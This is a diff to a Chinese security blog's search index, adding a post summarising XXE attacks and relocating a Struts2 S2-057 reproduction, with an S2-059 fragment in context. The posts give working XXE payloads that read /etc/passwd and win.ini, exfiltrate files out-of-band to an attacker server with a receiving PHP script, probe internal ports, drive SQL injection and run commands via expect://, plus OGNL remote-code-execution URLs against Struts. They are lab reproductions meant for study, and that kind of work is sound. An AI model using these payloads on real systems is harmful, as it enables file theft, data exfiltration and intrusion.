@@ -1,6 +1,119 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>XXE漏洞总结</title>
+    <url>/posts/1a711be2.html</url>
+    <content><![CDATA[<h1 id="XXE危害说明"><a href="#XXE危害说明" class="headerlink" title="XXE危害说明"></a>XXE危害说明</h1><p><code>XXE</code>就是<code>XML</code>外部实体注入。</p>
+<p>由于服务端未对提交的<code>xml</code>的数据中引入外部实体做必要的处理，而在外部实体中引入<code>php</code>伪协议从而造成的攻击。</p>
+<p>当允许引用外部实体时，通过构造恶意内容，可导致</p>
+<ul>
+<li>读取任意文件</li>
+<li>探测内网端口</li>
+<li>攻击内网网站</li>
+<li>执行系统命令</li>
+</ul>
+<h1 id="漏洞环境说明"><a href="#漏洞环境说明" class="headerlink" title="漏洞环境说明"></a>漏洞环境说明</h1><h2 id="PHP环境低于5-5使用此代码测试"><a href="#PHP环境低于5-5使用此代码测试" class="headerlink" title="PHP环境低于5.5使用此代码测试"></a>PHP环境低于5.5使用此代码测试</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$data</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$xml</span> = simplexml_load_string(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不需要回显时 注释print($xml);</span></span><br><span class="line"><span class="built_in">print</span>(<span class="variable">$xml</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="PHP环境大于等于5-5使用此代码测试"><a href="#PHP环境大于等于5-5使用此代码测试" class="headerlink" title="PHP环境大于等于5.5使用此代码测试"></a>PHP环境大于等于5.5使用此代码测试</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$data</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$xml</span> = simplexml_load_string(<span class="variable">$data</span>, <span class="string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不需要回显时 注释print($xml);</span></span><br><span class="line"><span class="built_in">print</span>(<span class="variable">$xml</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>注意点: 利用<code>xxe</code>读取的数据返回不能有<code>html</code>元素不然会报错</p>
+<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>利用各种协议可以读取文件，比如<code>file://</code>，<code>php://filter</code></p>
+<h4 id="windwos读取文件"><a href="#windwos读取文件" class="headerlink" title="windwos读取文件"></a>windwos读取文件</h4><p>使用<code>file://</code>协议：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span> &gt;]&gt;        </span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020111901.png" alt="tp2020111901.png"><br>使用<code>php://filter</code>协议：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=C:/Windows/win.ini&quot;</span>&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020111902.png" alt="tp2020111902.png"></p>
+<h4 id="linux读取文件"><a href="#linux读取文件" class="headerlink" title="linux读取文件"></a>linux读取文件</h4><p>使用<code>file://</code>协议：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span>        </span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用<code>php://filter</code>协议：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [<span class="meta">&lt;!ENTITY  <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>无回显的的话则需要将文件读取的内容发送到我们的远程服务器上。</p>
+<p>模拟场景：</p>
+<table>
+<thead>
+<tr>
+<th>服务器</th>
+<th>域名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击机</td>
+<td><a href="http://test.hzktester.top/XXE/">http://test.hzktester.top/XXE/</a></td>
+<td>远程服务器</td>
+</tr>
+<tr>
+<td>受害机</td>
+<td><a href="http://192.168.3.13/XXE/">http://192.168.3.13/XXE/</a></td>
+<td>本地搭建</td>
+</tr>
+</tbody></table>
+<ol>
+<li><p>在攻击机建立<code>php</code>文件接收数据</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">// 文件名称：get.php</span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag"><span class="attr">file_put_contents</span>(&#x27;<span class="attr">xxe_data.txt</span>&#x27;, $<span class="attr">_GET</span>[&#x27;<span class="attr">xxe_local</span>&#x27;]);</span></span><br><span class="line"><span class="tag">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在攻击机建立<code>xml</code>文件给用于给受害机引入 </p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">// 文件名称：1.xml</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">data</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=C:/Windows/win.ini&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">param1</span> <span class="meta-string">&quot;&lt;!ENTITY exfil SYSTEM &#x27;http://test.hzktester.top/XXE/get.php?xxe_local=%data;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在受害机上执行<code>payload</code>：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">sp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://test.hzktester.top/XXE/1.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;exfil;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020111903.png" alt="tp2020111903.png"></p>
+</li>
+<li><p>执行完以后会把数据<code>base64</code>回传给<code>get.php</code>  。<code>get.php</code>会创建一个<code>xxe_data.txt</code>文件并且写入数据</p>
+</li>
+</ol>
+<p><img src="https://qiniu.hzktester.top/tp2020111904.png" alt="image.png"></p>
+<h2 id="探测内网"><a href="#探测内网" class="headerlink" title="探测内网"></a>探测内网</h2><p>修改<a href="http://127.0.0.1/"><code>http://127.0.0.1:80</code></a> 为任意地址端口</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:80&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行以后<br>如果访问的端口是打开的,那么他返回就会很快<br>如果返回很慢,就说明端口没开<br><img src="https://qiniu.hzktester.top/tp2020111905.png" alt="image.png"><br>这里页面显示报错了，使用返回的数据是<code>html</code></p>
+<h2 id="攻击内网网站"><a href="#攻击内网网站" class="headerlink" title="攻击内网网站"></a>攻击内网网站</h2><p>例如：<a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a>现在有<code>sql</code>注入<br>为了解决返回有<code>html</code>会爆错的问题,我们可以把数据<code>base64</code>发送到我们服务器进行查看</p>
+<table>
+<thead>
+<tr>
+<th>服务器</th>
+<th>域名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击机</td>
+<td><a href="http://test.hzktester.top/XXE/">http://test.hzktester.top/XXE/</a></td>
+<td>远程服务器</td>
+</tr>
+<tr>
+<td>受害机</td>
+<td><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a></td>
+<td>本地搭建</td>
+</tr>
+</tbody></table>
+<ol>
+<li><p>在攻击机建立<code>php</code>文件接收数据 </p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">// 文件名称：get.php</span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag"><span class="attr">file_put_contents</span>(&#x27;<span class="attr">xxe_data.txt</span>&#x27;, $<span class="attr">_GET</span>[&#x27;<span class="attr">xxe_local</span>&#x27;]);</span></span><br><span class="line"><span class="tag">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在攻击机建立<code>xml</code>文件用于给受害机引入</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">// 文件名称：2.xml</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">data</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">param1</span> <span class="meta-string">&quot;&lt;!ENTITY exfil SYSTEM &#x27;http://test.hzktester.top/XXE/get.php?xxe_local=%data;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>对<a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1:80/sqli-labs/Less-1/?id=1</a>进行普通注入即可<br>例如：<br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1:80/sqli-labs/Less-1/?id=1</a><a href="http://127.0.0.1/test/test_sql.php?id=1%27">‘</a> and ‘1’=’1<br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1:80/sqli-labs/Less-1/?id=1</a><a href="http://127.0.0.1/test/test_sql.php?id=1%27">‘</a> and ‘1’=’2</p>
+</blockquote>
+</li>
+<li><p>受害机运行<code>payload</code>：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">sp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://test.hzktester.top/XXE/2.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;exfil;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020111906.png" alt="tp2020111906.png"></p>
+</li>
+<li><p>执行完以后会把数据<code>base64</code>回传给<code>get.php</code>  。<code>get.php</code>会创建一个<code>xxe_data.txt</code>文件并且写入数据</p>
+</li>
+</ol>
+<p><img src="https://qiniu.hzktester.top/tp2020111907.png" alt="image.png"><br><img src="https://qiniu.hzktester.top/tp2020111908.png" alt="image.png"><br>解密返回的就是页面数据 然后不断修改<code>2.xml</code>进行注入即可</p>
+<h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><p>需要系统安装了<code>PECL</code>上的<code>Expect</code>拓展</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://ipconfig&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="感谢师傅的笔记："><a href="#感谢师傅的笔记：" class="headerlink" title="感谢师傅的笔记："></a>感谢师傅的笔记：</h2><p>都是抄他的！<br><a href="https://www.yuque.com/pmiaowu/web_security_1/vgbyxt">https://www.yuque.com/pmiaowu/web_security_1/vgbyxt</a></p>
+]]></content>
+      <categories>
+        <category>Web基础</category>
+      </categories>
+      <tags>
+        <tag>XXE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Radis未授权访问漏洞复现</title>
     <url>/posts/b70654.html</url>
     <content><![CDATA[<h2 id="漏洞特征："><a href="#漏洞特征：" class="headerlink" title="漏洞特征："></a>漏洞特征：</h2><ul>
@@ -3942,28 +4055,6 @@
       </tags>
   </entry>
   <entry>
-    <title>S2-057 CVE-2018-11776复现过程</title>
-    <url>/posts/e935ed10.html</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081414.png" alt="image"></p>
-</li>
-<li><p>poc利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
-<p><img src="https://qiniu.hzktester.top/tp2020081415.png" alt="image"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>S2-059 CVE-2019-0230复现过程</title>
     <url>/posts/a058ddb7.html</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Struts于2020年8月13日披露 S2-059 Struts 远程代码执行漏洞（CVE-2019-0230），在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大。腾讯安全专家提醒Apache Struts用户尽快升级到2.5.22或以上版本，避免遭遇黑客攻击。    </p>
@@ -3979,6 +4070,28 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%25&#123;%23_memberAccess.allowPrivateAccess%3dtrue,%23_memberAccess.allowStaticMethodAccess%3dtrue,%23_memberAccess.excludedClasses%3d%23_memberAccess.acceptProperties,%23_memberAccess.excludedPackageNamePatterns%3d%23_memberAccess.acceptProperties,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23a%3d%40java.lang.Runtime%40getRuntime(),%23s%3dnew+java.util.Scanner(%23a.exec(&#39;ls&#39;).getInputStream()).useDelimiter(&#39;\\\\A&#39;),%23str%3d%23s.hasNext()%3f%23s.next()%3a&#39;&#39;,%23res.print(%23str),%23res.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://qiniu.hzktester.top/tp2020081417.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-057 CVE-2018-11776复现过程</title>
+    <url>/posts/e935ed10.html</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081414.png" alt="image"></p>
+</li>
+<li><p>poc利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020081415.png" alt="image"></p>
+</li>
+</ol>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
